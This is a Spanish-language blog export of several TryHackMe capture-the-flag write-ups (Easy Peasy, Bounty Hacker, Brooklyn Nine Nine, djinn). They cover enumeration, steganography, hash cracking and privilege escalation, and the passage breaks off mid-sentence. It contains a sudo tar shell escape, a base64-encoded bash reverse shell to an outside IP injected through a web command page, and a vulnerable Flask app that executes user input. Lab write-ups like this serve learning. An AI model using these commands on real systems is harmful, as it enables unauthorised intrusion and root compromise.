\\_\\ \\ / \\ \\ / \\ \\ / /\\ \\ \\ \\ \\__ /\\_\\/ / /\\ \\__ /\\__ \\ / / /\\ \\ \\ \\ \\__ /\\_\\/ / /\\ \\__ /\\__ \\ / /\\ \\ \\ / /\\ \\ \\ / / /\\ \\_\\ \\___\\ / / / / /\\ \\___\\/ /_ \\ \\ / / /\\ \\ \\ \\ \\___\\ / / / / /\\ \\___\\/ /_ \\ \\ / / /\\ \\_\\ / / /\\ \\_\\ / / /_/ / /\\__ / / / /\\ \\ \\ \\/___/ / /\\ \\ \\/ / /\\ \\_\\ \\ \\__ / / / /\\ \\ \\ \\/___/ / /\\ \\ \\/ /_/_ \\/_/ / / /_/ / / / / /__\\/ / / / / / / / \\ \\ \\ / / / \\/_/ / /\\ \\ \\___\\ / / / / / / \\ \\ \\ / / / \\/_/ /____/\\ / / /__\\/ / / / /_____/ / / / / / _ \\ \\ \\ / / / / / / \\ \\ \\__// / / / / _ \\ \\ \\ / / / / /\\____\\/ / / /_____/ / / /\\ \\ \\ / / /___/ / /_/\\__/ / / / / / / / /____\\_\\ \\ / / /___/ / /_/\\__/ / / / / / / / /______ / / /\\ \\ \\ / / / \\ \\ \\/ / /____\\/ /\\ \\/___/ / /_/ / / / /__________/ / /____\\/ /\\ \\/___/ / /_/ / / / /_______/ / / \\ \\ \\ \\/_/ \\_\\/\\/_________/ \\_____\\/ \\_\\/ \\/_____________\\/_________/ \\_____\\/ \\_\\/ \\/__________\\/_/ \\_\\/ [?] Started at\t: 2020-08-05 00:52:23 GET\t200 OK\thttp://easy.thm/hidden/ GET 200 OK http://easy.thm/hidden/index.html GET 301 Moved Permanently http://easy.thm/hidden/whatever =\u0026gt; http://easy.thm/hidden/whatever/ GET 200 OK http://easy.thm/hidden/ ^C En una de las paginas encontradas vemos base64, el cual contiene una flag.\nHTTP 65524 Encontramos la pagina de apache en el puerto 65524.\nEncontramos en el codigo fuente una flag.\nAdemás un parrafo escondido, con una cadena de caracteres \u0026ldquo;codificado\u0026rdquo;.\nEjecutamos rustbuster en este puerto al igual que en el puerto 80.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 root@upset:~/thm/easypeasy /opt/rustbuster/rustbuster dir -u http://easy.thm:65524/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 150 -e php,html,txt -o high_port.txt ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~ _ _ _ _ _ _ _ _ _ _ /\\ \\ /\\_\\ / /\\ /\\ \\ / /\\ /\\_\\ / /\\ /\\ \\ /\\ \\ /\\ \\ / \\ \\/ / / _ / / \\ \\_\\ \\ / / \\ / / / _ / / \\ \\_\\ \\ / \\ \\ / \\ \\ / /\\ \\ \\ \\ \\__ /\\_\\/ / /\\ \\__ /\\__ \\ / / /\\ \\ \\ \\ \\__ /\\_\\/ / /\\ \\__ /\\__ \\ / /\\ \\ \\ / /\\ \\ \\ / / /\\ \\_\\ \\___\\ / / / / /\\ \\___\\/ /_ \\ \\ / / /\\ \\ \\ \\ \\___\\ / / / / /\\ \\___\\/ /_ \\ \\ / / /\\ \\_\\ / / /\\ \\_\\ / / /_/ / /\\__ / / / /\\ \\ \\ \\/___/ / /\\ \\ \\/ / /\\ \\_\\ \\ \\__ / / / /\\ \\ \\ \\/___/ / /\\ \\ \\/ /_/_ \\/_/ / / /_/ / / / / /__\\/ / / / / / / / \\ \\ \\ / / / \\/_/ / /\\ \\ \\___\\ / / / / / / \\ \\ \\ / / / \\/_/ /____/\\ / / /__\\/ / / / /_____/ / / / / / _ \\ \\ \\ / / / / / / \\ \\ \\__// / / / / _ \\ \\ \\ / / / / /\\____\\/ / / /_____/ / / /\\ \\ \\ / / /___/ / /_/\\__/ / / / / / / / /____\\_\\ \\ / / /___/ / /_/\\__/ / / / / / / / /______ / / /\\ \\ \\ / / / \\ \\ \\/ / /____\\/ /\\ \\/___/ / /_/ / / / /__________/ / /____\\/ /\\ \\/___/ / /_/ / / / /_______/ / / \\ \\ \\ \\/_/ \\_\\/\\/_________/ \\_____\\/ \\_\\/ \\/_____________\\/_________/ \\_____\\/ \\_\\/ \\/__________\\/_/ \\_\\/ [?] Started at\t: 2020-08-05 01:14:24 GET\t200 OK\thttp://easy.thm:65524/ GET 403 Forbidden http://easy.thm:65524/.html GET 200 OK http://easy.thm:65524/index.html GET 200 OK http://easy.thm:65524/robots.txt C^ En robots.txt encontramos un hash MD5, utilizamos md5hashing para obtener el texto plano el cual es una flag.\nRustbuster no nos dio mas que errores, por lo que nos concentramos en el texto \u0026ldquo;codificado\u0026rdquo; que encontramos. Utilizamos CyberChef para poder decodificar el texto. Encontramos que es posiblo utilizando base62, el cual nos devolvio lo que parece ser un directorio.\nEncontramos en este nuevo directorio lo que parece ser un hash SHA-256.\nUtilizamos nuevamente md5hashing el cual nos mostró una \u0026ldquo;contraseña\u0026rdquo;.\nDescargamos la imagen de la pagina, utilizando steghide y la contraseña que encontramos logramos encontrar un archivo que contiene codificado en binario un texto y el nombre de un usuario.\nNuevamente con CyberChef logramos obtener el texto.\nBORING - USER Con las credenciales que encontramos ingresamos por medio del servicio SSH de la maquina en el puerto 6498.\nEncontramos nuestra flag user.txt la cual esta \u0026lsquo;rotada\u0026rsquo;.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con cat /etc/crontab y vemos cron que se ejecuta con el usuario root y que ejecuta el archivo .mysecretcronjob.sh en /var/www/.\nEl archivo no contiene ningun comando por lo que agregamos una shell inversa al archivo.\nEjecutamos netcat para esperar la conexion de nuestra shell, obtuvimos una shell con usuario root y nuestra flag root.txt.\n","description":"Easy Peasy es una maquina de TryHackMe, presenta retos de Esteganografia y Crackeo de hashes para obtener user. Un CronJob permitio obtener acceso privilegiado.","id":113,"section":"posts","tags":["steganography","steghide","cron"],"title":"TryHackMe - Easy Peasy","uri":"https://sckull.github.io/posts/easypeasy/"},{"content":"\rBounty Hacker es una maquina de TryHackMe. Enumeramos el servicio FTP donde observamos un wordlist el cual utilizamos para realizar un ataque de contraseñas con Hydra para obtener acceso por SSH. Escalamos privilegios con sudo y tar.\nRoom Titulo Bounty Hacker Descripción You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker! Puntos 150 Dificultad Facil Maker Sevuhl NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), ssh (22) y el puerto http (80) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 # Nmap 7.80 scan initiated Sat Aug 1 10:19:44 2020 as: nmap -sV -o nmap_scan_mini bountyhacker.thm Nmap scan report for bountyhacker.thm (10.10.131.158) Host is up (0.28s latency). Not shown: 967 filtered ports, 30 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Aug 1 10:20:09 2020 -- 1 IP address (1 host up) scanned in 24.80 seconds FTP En el puerto 21 FTP logramos ingresar como anonymous en donde encontramos dos archivos, uno que contiene lo que parece ser un wordlist, el segundo dos \u0026ldquo;tareas\u0026rdquo; y un posible nombre de usuario.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 root@upset:~/thm/bountyhacker# ftp bountyhacker.thm Connected to bountyhacker.thm. 220 (vsFTPd 3.0.3) Name (bountyhacker.thm:root): anonymous 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-rw-r-- 1 ftp ftp 418 Jun 07 21:41 locks.txt -rw-rw-r-- 1 ftp ftp 68 Jun 07 21:47 task.txt 226 Directory send OK. ftp\u0026gt; get locks.txt local: locks.txt remote: locks.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for locks.txt (418 bytes). 226 Transfer complete. 418 bytes received in 0.04 secs (10.7433 kB/s) ftp\u0026gt; get task.txt local: task.txt remote: task.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for task.txt (68 bytes). 226 Transfer complete. 68 bytes received in 0.00 secs (295.1389 kB/s) ftp\u0026gt; exit 221 Goodbye. root@upset:~/thm/bountyhacker# cat locks.txt rEddrAGON ReDdr4g0nSynd!cat3 Dr@gOn$yn9icat3 [... REDACTED ...] REd$yNdIc47e dr@goN5YNd1c@73 rEDdrAGOnSyNDiCat3 r3ddr@g0N ReDSynd1ca7e root@upset:~/thm/bountyhacker# cat task.txt 1.) Protect Vicious. 2.) Plan for Red Eye pickup on the moon. -lin root@upset:~/thm/bountyhacker# HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos, no encontramos nada interesante.\n1 2 3 4 5 root@upset:~/thm/bountyhacker# gobuster dir -u http://bountyhacker.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 403) LIN - USER Utilizamos el usuario y el \u0026ldquo;wordlist\u0026rdquo; que encontramos en el puerto 21 con Hydra en el puerto 22 de SSH, donde logramos encontrar la contraseña para este usuario.\nLogramos obtener una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando tar. Utilizamos tar para obtener una shell root.\n1 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh Obtuvimos una shell con usuario root y nuestra flag root.txt.\n","description":"Bounty Hacker es una maquina de TryHackMe. Enumeramos el servicio FTP donde observamos un wordlist el cual utilizamos para realizar un ataque de contraseñas con Hydra para obtener acceso por SSH. Escalamos privilegios con sudo y tar.","id":114,"section":"posts","tags":["ftp","sudo privesc","hydra"],"title":"TryHackMe - Bounty Hacker","uri":"https://sckull.github.io/posts/bountyhacker/"},{"content":"\rBrooklyn Nine Nine es una maquina de TryHackMe, presenta un reto de esteganografia y permisos SUID en vim.\nRoom Titulo Brooklyn Nine Nine Descripción This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box. Puntos 80 Dificultad Facil Maker Fsociety2006 NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 # Nmap 7.80 scan initiated Wed Jul 29 16:46:49 2020 as: nmap -sV -o nmap_scan_mini brooklyn.thm Nmap scan report for brooklyn.thm (10.10.125.15) Host is up (0.31s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jul 29 16:47:33 2020 -- 1 IP address (1 host up) scanned in 43.91 seconds FTP Ingresamos en el servicio FTP con las credenciales de anonymous (anonymous:anonymous) donde encontramos una nota, además dos posibles nombres de usuario Amy y Jake.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 root@upset:~/thm/brooklyn# ftp brooklyn.thm Connected to brooklyn.thm. 220 (vsFTPd 3.0.3) Name (brooklyn.thm:root): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 0 0 119 May 17 23:17 note_to_jake.txt 226 Directory send OK. ftp\u0026gt; get note_to_jake.txt local: note_to_jake.txt remote: note_to_jake.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes). 226 Transfer complete. 119 bytes received in 0.01 secs (12.3510 kB/s) ftp\u0026gt; exit 221 Goodbye. root@upset:~/thm/brooklyn# cat note_to_jake.txt From Amy, Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine root@upset:~/thm/brooklyn# HTTP Encontramos una pagina web en el puerto 80.\nEn el codigo fuente de la pagina encontramos un comentario que habla sobre esteganografia.\n1 2 \u0026lt;p\u0026gt;This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.\u0026lt;/p\u0026gt; \u0026lt;!-- Have you ever heard of steganography? --\u0026gt; Utilizamos STEGCRACKER para hacer un ataque de contraseñas a la imagen. Encontramos la contraseña y un archivo que contiene una contraseña, además un posible usuario Holt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 root@upset:~/thm/brooklyn# stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt StegCracker 2.0.9 - (https://github.com/Paradoxis/StegCracker) Copyright (c) 2020 - Luke Paris (Paradoxis) Counting lines in wordlist.. Attacking file \u0026#39;brooklyn99.jpg\u0026#39; with wordlist \u0026#39;/usr/share/wordlists/rockyou.txt\u0026#39;.. Successfully cracked file with password: admin Tried 20587 passwords Your file has been written to: brooklyn99.jpg.out admin root@upset:~/thm/brooklyn# cat brooklyn99.jpg.out Holts Password: fluf[... REDACTED ...]nenine Enjoy!! root@upset:~/thm/brooklyn# GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 root@upset:~/thm/brooklyn# gobuster dir -u http://brooklyn.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 25 -x php,html,txt /index.html (Status: 200) HOLT - USER Utilizamos la contraseña con los usuarios que encontramos y logramos obtener una shell con el usuario holt, y la flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando nano. Utilizamos env para obtener una shell root.\nUtilizamos GFOBINS - NANO para obtener una shell con el usuario root y nuestra flag root.txt.\n","description":"Brooklyn Nine Nine es una maquina de TryHackMe, presenta un reto de esteganografia y permisos SUID en vim.","id":115,"section":"posts","tags":["ftp","steganography","stegcracker","nano"],"title":"TryHackMe - Brooklyn Nine Nine","uri":"https://sckull.github.io/posts/brooklyn99/"},{"content":"\rdjinn es una maquina de TryHackMe, ejecutamos una shell inversa en una ruta de la aplicacion web, en el codigo fuente encontramos la ruta de un archivo con credenciales que nos permitio acutalizar nuestra shell al siguiente usuario que además obtuvimos acceso por SSH realizando Port Knocking. Para el movimiento lateral ejecutamos genie con parametros para una shell. Escalamos privilegios analizando el codigo fuente de un script en Python el cual no tenia validaciones en las variables lo que nos permitía ejecutar /bin/sh.\nRoom Titulo djinn Descripción Intermediate level vulnerable box. Puntos * Dificultad Media Maker falconfeast NMAP Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 # Nmap 7.80 scan initiated Sat Aug 1 11:03:49 2020 as: nmap -sV -o nmap_scan_mini djinn.thm Nmap scan report for djinn.thm (10.10.181.33) Host is up (0.26s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp filtered ssh Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Aug 1 11:03:57 2020 -- 1 IP address (1 host up) scanned in 7.89 seconds # Nmap 7.80 scan initiated Sat Aug 1 11:03:02 2020 as: nmap -sV -p- -T5 -o nmap_scan djinn.thm Warning: 10.10.181.33 giving up on port because retransmission cap hit (2). Nmap scan report for djinn.thm (10.10.181.33) Host is up (0.25s latency). Not shown: 65115 closed ports, 417 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 1337/tcp open waste? 7331/tcp open http Werkzeug httpd 0.16.0 (Python 2.7.15+) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port1337-TCP:V=7.80%I=7%D=8/1%Time=5F2594CD%P=x86_64-pc-linux-gnu%r(NUL SF:L,1BC,\u0026#34;\\x20\\x20____\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_____\\x20_\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\x20/\\x20___\\|\\x20__\\x SF:20_\\x20_\\x20__\\x20___\\x20\\x20\\x20___\\x20\\x20\\|_\\x20\\x20\\x20_\\(_\\)_\\x20_ SF:_\\x20___\\x20\\x20\\x20___\\x20\\n\\|\\x20\\|\\x20\\x20_\\x20/\\x20_`\\x20\\|\\x20\u0026#39;_\\x SF:20`\\x20_\\x20\\\\\\x20/\\x20_\\x20\\\\\\x20\\x20\\x20\\|\\x20\\|\\x20\\|\\x20\\|\\x20\u0026#39;_\\x2 SF:0`\\x20_\\x20\\\\\\x20/\\x20_\\x20\\\\\\n\\|\\x20\\|_\\|\\x20\\|\\x20\\(_\\|\\x20\\|\\x20\\|\\x SF:20\\|\\x20\\|\\x20\\|\\x20\\|\\x20\\x20__/\\x20\\x20\\x20\\|\\x20\\|\\x20\\|\\x20\\|\\x20\\| SF:\\x20\\|\\x20\\|\\x20\\|\\x20\\|\\x20\\x20__/\\n\\x20\\\\____\\|\\\\__,_\\|_\\|\\x20\\|_\\|\\x SF:20\\|_\\|\\\\___\\|\\x20\\x20\\x20\\|_\\|\\x20\\|_\\|_\\|\\x20\\|_\\|\\x20\\|_\\|\\\\___\\|\\n\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n SF:\\nLet\u0026#39;s\\x20see\\x20how\\x20good\\x20you\\x20are\\x20with\\x20simple\\x20maths\\ SF:nAnswer\\x20my\\x20questions\\x201000\\x20times\\x20and\\x20I\u0026#39;ll\\x20give\\x20y SF:ou\\x20your\\x20gift\\.\\n\\(7,\\x20\u0026#39;\\*\u0026#39;,\\x209\\)\\n\u0026gt;\\x20\u0026#34;)%r(RPCCheck,1BC,\u0026#34;\\x2 SF:0\\x20____\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_____\\x20_\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\x20/\\x20___\\|\\x20__\\x20_\\x20_\\x SF:20__\\x20___\\x20\\x20\\x20___\\x20\\x20\\|_\\x20\\x20\\x20_\\(_\\)_\\x20__\\x20___\\x SF:20\\x20\\x20___\\x20\\n\\|\\x20\\|\\x20\\x20_\\x20/\\x20_`\\x20\\|\\x20\u0026#39;_\\x20`\\x20_\\x SF:20\\\\\\x20/\\x20_\\x20\\\\\\x20\\x20\\x20\\|\\x20\\|\\x20\\|\\x20\\|\\x20\u0026#39;_\\x20`\\x20_\\x2 SF:0\\\\\\x20/\\x20_\\x20\\\\\\n\\|\\x20\\|_\\|\\x20\\|\\x20\\(_\\|\\x20\\|\\x20\\|\\x20\\|\\x20\\| SF:\\x20\\|\\x20\\|\\x20\\x20__/\\x20\\x20\\x20\\|\\x20\\|\\x20\\|\\x20\\|\\x20\\|\\x20\\|\\x20 SF:\\|\\x20\\|\\x20\\|\\x20\\x20__/\\n\\x20\\\\____\\|\\\\__,_\\|_\\|\\x20\\|_\\|\\x20\\|_\\|\\\\_ SF:__\\|\\x20\\x20\\x20\\|_\\|\\x20\\|_\\|_\\|\\x20\\|_\\|\\x20\\|_\\|\\\\___\\|\\n\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\nLet\u0026#39;s\\x2 SF:0see\\x20how\\x20good\\x20you\\x20are\\x20with\\x20simple\\x20maths\\nAnswer\\x2 SF:0my\\x20questions\\x201000\\x20times\\x20and\\x20I\u0026#39;ll\\x20give\\x20you\\x20your SF:\\x20gift\\.\\n\\(8,\\x20\u0026#39;\\+\u0026#39;,\\x206\\)\\n\u0026gt;\\x20\u0026#34;); Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Aug 1 11:15:40 2020 -- 1 IP address (1 host up) scanned in 758.06 seconds FTP En el puerto 21 FTP logramos ingresar como anonymous en donde encontramos tres archivos, uno que contiene lo que parece ser credenciales, el segundo un mensaje para @nitish81299 (nada interesante en Github y Twitter) y un posible nombre de usuario.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 root@upset:~/thm/djinn# ftp djinn.thm Connected to djinn.thm. 220 (vsFTPd 3.0.3) Name (djinn.thm:root): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 0 115 4096 Oct 21 2019 . drwxr-xr-x 2 0 115 4096 Oct 21 2019 .. -rw-r--r-- 1 0 0 11 Oct 20 2019 creds.txt -rw-r--r-- 1 0 0 128 Oct 21 2019 game.txt -rw-r--r-- 1 0 0 113 Oct 21 2019 message.txt 226 Directory send OK. ftp\u0026gt; get creds.txt local: creds.txt remote: creds.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for creds.txt (11 bytes). 226 Transfer complete. 11 bytes received in 0.00 secs (54.5289 kB/s) ftp\u0026gt; get game.txt local: game.txt remote: game.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for game.txt (128 bytes). 226 Transfer complete. 128 bytes received in 0.00 secs (968.9923 kB/s) ftp\u0026gt; get message.txt local: message.txt remote: message.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for message.txt (113 bytes). 226 Transfer complete. 113 bytes received in 0.00 secs (144.6285 kB/s) ftp\u0026gt; exit 221 Goodbye. root@upset:~/thm/djinn# ls creds.txt game.txt message.txt nmap_scan_mini root@upset:~/thm/djinn# cat creds.txt nitu:[... REDACTED ...] root@upset:~/thm/djinn# cat message.txt @nitish81299 I am going on holidays for few days, please take care of all the work. And don\u0026#39;t mess up anything. root@upset:~/thm/djinn# cat game.txt oh and I forgot to tell you I\u0026#39;ve setup a game for you on port 1337. See if you can reach to the final level and get the prize. root@upset:~/thm/djinn# HTTP Encontramos una pagina web en el puerto 7331.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 root@upset:~/thm/djinn# gobuster dir -u http://djinn.thm:7331/ -w /usr/share/wordlists/dirbuster/directory-list-medium.txt -q -t 25 -x php,html,txt /wish /genie WWW-DATA - USER Encontramos una pagina /wish donde al ingresar un comando, este se ejecuta pero el resultado lo muestra en una url redireccionada.\nEjecutamos una shell codificada:\n1 2 3 4 #Shell echo -n \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/1338 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; |base64 #Ejecutamos echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC8xMzM4IDA+JjEi|base64 -d|bash Obtenemos una shell con el usuario www-data.\nNITISH - USER En el archivo app.py el cual ejecuta la pagina anterior encontramos una direccion a un archivo, este archivo contiene lo que parecen credenciales del usuario nitish.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 import subprocess from flask import Flask, redirect, render_template, request, url_for app = Flask(__name__) app.secret_key = \u0026#34;key\u0026#34; + CREDS = \u0026#34;/home/nitish/.dev/creds.txt\u0026#34; RCE = [\u0026#34;/\u0026#34;, \u0026#34;.\u0026#34;, \u0026#34;?\u0026#34;, \u0026#34;*\u0026#34;, \u0026#34;^\u0026#34;, \u0026#34;$\u0026#34;, \u0026#34;eval\u0026#34;, \u0026#34;;\u0026#34;] def validate(cmd): if CREDS in cmd and \u0026#34;cat\u0026#34; not in cmd: return True try: for i in RCE: for j in cmd: if i == j: return False return True except Exception: return False @app.route(\u0026#34;/\u0026#34;, methods=[\u0026#34;GET\u0026#34;]) def index(): return render_template(\u0026#34;main.html\u0026#34;) @app.route(\u0026#34;/wish\u0026#34;, methods=[\u0026#39;POST\u0026#39;, \u0026#34;GET\u0026#34;]) def wish(): execute = request.form.get(\u0026#34;cmd\u0026#34;) if execute: if validate(execute): output = subprocess.Popen(execute, shell=True, stdout=subprocess.PIPE).stdout.read() else: output = \u0026#34;Wrong choice of words\u0026#34; return redirect(url_for(\u0026#34;genie\u0026#34;, name=output)) else: return render_template(\u0026#39;wish.html\u0026#39;) @app.route(\u0026#39;/genie\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def genie(): if \u0026#39;name\u0026#39; in request.args: page = request.args.get(\u0026#39;name\u0026#39;) else: page = \u0026#34;It\u0026#39;s not that hard\u0026#34; return render_template(\u0026#39;genie.html\u0026#39;, file=page) if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, debug=True) Utilizamos la contraseña con el usuario y logramos obtener una shell con el usuario nitish y nuestra flag user.txt.\nUSER - SAM \u0026amp; KNOCKING PORT Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando genie esto con el usuario sam sin contraseña.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 nitish@djinn:~$ sudo -l -l sudo -l -l Matching Defaults entries for nitish on djinn: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User nitish may run the following commands on djinn: Sudoers entry: RunAsUsers: sam Options: !authenticate Commands: /usr/bin/genie nitish@djinn:~$ Otro de los hallazgos que hicimos es un archivo de configuracion de knock\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 nitish@djinn:/etc$ cat knockd.conf cat knockd.conf [options] UseSyslog [openSSH] sequence = 1356, 6784, 3409 seq_timeout = 5 command = /sbin/iptables -I INPUT 1 -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 3409, 6784, 1356 seq_timeout = 5 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn Utilizamos la secuencia para obtener una shell en SSH.\nAhora si, seguimos investigando sobre /usr/bin/genie, le pasamos los parametros que pide este ejecutable, esperando a que ejecute nuestro comando, pero al parecer no se agrega en ningun tipo de cron o proceso\n1 2 3 4 nitish@djinn:/etc$ /usr/bin/genie -p bash -g -e \u0026#34;ping -c 5 10.2.29.162\u0026#34; wish /usr/bin/genie -p bash -g -e \u0026#34;ping -c 5 10.2.29.162\u0026#34; wish We\u0026#39;ve added your wish to our records. Continue praying!! En la documentacion de este ejecutable encontramos un parametro que no aparece en el ejecutable al mostrar la ayuda (-h), agregamos este parametro junto al usuario sam. Logramos obtener una shell con este ultimo usuario.\n1 2 3 4 nitish@djinn:~$ sudo -u sam /usr/bin/genie -cmd gg my man!! $ whoami sam PRIVILEGE ESCALATION Hicimos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando lago.\n1 2 3 4 5 6 7 8 9 10 11 12 $ sudo -l -l Matching Defaults entries for sam on djinn: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User sam may run the following commands on djinn: Sudoers entry: RunAsUsers: root Options: !authenticate Commands: /root/lago $ Ejecutamos este comando y nos muestra diferentes opciones pero ninguna de estas nos deja escalar privilegios. En la carpeta de este usuario encontramos un archivo .pyc el cual al leer las strings encontramos las mismas que el comando lago muestra.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ strings .pyc getuser( system( randintc Working on it!! ( /home/mzfr/scripts/exp.pyt naughtyboi Choose a number between 1 to 100: s Enter your number: s /bin/shs Better Luck next time( inputR numt /home/mzfr/scripts/exp.pyt [... REDACTED ...] Copiamos este archivo a 